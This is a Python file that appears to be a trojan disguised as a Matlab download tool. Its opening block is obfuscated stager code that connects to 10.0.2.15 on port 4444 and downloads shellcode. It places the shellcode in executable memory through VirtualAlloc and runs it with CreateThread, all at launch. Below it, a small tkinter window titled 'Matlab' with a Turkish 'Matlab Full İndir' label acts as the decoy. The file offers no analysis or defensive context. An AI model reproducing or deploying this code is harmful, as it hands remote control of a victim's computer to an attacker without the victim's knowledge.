
import struct, socket, binascii, ctypes as kJRiwkJGUIK, random, time
yYmuwl, kRPhwgIjrwYAEqd = None, None
def hYpRoIN():
	try:
		global kRPhwgIjrwYAEqd
		kRPhwgIjrwYAEqd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		kRPhwgIjrwYAEqd.connect(('10.0.2.15', 4444))
		JGTwPhvfjyDZFR = struct.pack('<i', kRPhwgIjrwYAEqd.fileno())
		l = struct.unpack('<i', kRPhwgIjrwYAEqd.recv(4))[0]
		LrOYBuxXvNMA = b"     "
		while len(LrOYBuxXvNMA) < l: LrOYBuxXvNMA += kRPhwgIjrwYAEqd.recv(l)
		odTayIyGdpLsg = kJRiwkJGUIK.create_string_buffer(LrOYBuxXvNMA, len(LrOYBuxXvNMA))
		odTayIyGdpLsg[0] = binascii.unhexlify('BF')
		for i in range(4): odTayIyGdpLsg[i+1] = JGTwPhvfjyDZFR[i]
		return odTayIyGdpLsg
	except: return None
def fkjVxjdrhFKl(kHyErT):
	if kHyErT != None:
		VeRhCLZgd = bytearray(kHyErT)
		RMuuapBoBYo = kJRiwkJGUIK.windll.kernel32.VirtualAlloc(kJRiwkJGUIK.c_int(0),kJRiwkJGUIK.c_int(len(VeRhCLZgd)),kJRiwkJGUIK.c_int(0x3000),kJRiwkJGUIK.c_int(0x40))
		wdfrHkiHE = (kJRiwkJGUIK.c_char * len(VeRhCLZgd)).from_buffer(VeRhCLZgd)
		kJRiwkJGUIK.windll.kernel32.RtlMoveMemory(kJRiwkJGUIK.c_int(RMuuapBoBYo), wdfrHkiHE, kJRiwkJGUIK.c_int(len(VeRhCLZgd)))
		ht = kJRiwkJGUIK.windll.kernel32.CreateThread(kJRiwkJGUIK.c_int(0),kJRiwkJGUIK.c_int(0),kJRiwkJGUIK.c_int(RMuuapBoBYo),kJRiwkJGUIK.c_int(0),kJRiwkJGUIK.c_int(0),kJRiwkJGUIK.pointer(kJRiwkJGUIK.c_int(0)))
		kJRiwkJGUIK.windll.kernel32.WaitForSingleObject(kJRiwkJGUIK.c_int(ht),kJRiwkJGUIK.c_int(-1))
yYmuwl = hYpRoIN()
fkjVxjdrhFKl(yYmuwl)

import tkinter as tk

def pencere_ac():
    pencere=tk.Tk()
    pencere.title("Matlab")
    pencere.geometry("80x160")
    tk.Label(pencere,text="Matlab Full İndir")
    pencere.mainloop()
    
penecere_ac()
